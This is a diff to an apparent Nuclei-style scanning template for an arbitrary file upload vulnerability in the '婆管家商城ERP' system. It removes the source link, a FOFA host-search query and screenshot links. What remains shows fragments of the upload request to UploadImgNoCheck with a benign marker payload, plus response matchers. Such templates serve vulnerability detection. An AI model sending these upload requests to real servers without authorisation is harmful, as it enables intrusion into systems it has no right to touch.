@@ -3,12 +3,8 @@ info:
   name: 婆管家商城ERP uploadimgnocheck 存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rgg5dgw446zk69bc'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rgg5dgw446zk69bc
-    fofa: body="/Utility/JSHeadJump.js"
 http:
 - raw:
   - 'POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1
@@ -39,9 +35,7 @@ http:
 
     12345678
 
-    -----------------------------58nlgtjoht3z43rf5hn3--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226566235-aa25fc06-08df-4276-8748-a443e23adb91.png)'
+    -----------------------------58nlgtjoht3z43rf5hn3--'
   redirects: false
   matchers:
   - status:
@@ -66,9 +60,7 @@ http:
 
     Range: bytes=0-100
 
-    Upgrade-Insecure-Requests: 1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226566502-cd385d5f-80d0-4ba4-9398-082db1f1a7af.png)'
+    Upgrade-Insecure-Requests: 1'
   redirects: false
   matchers:
   - status:
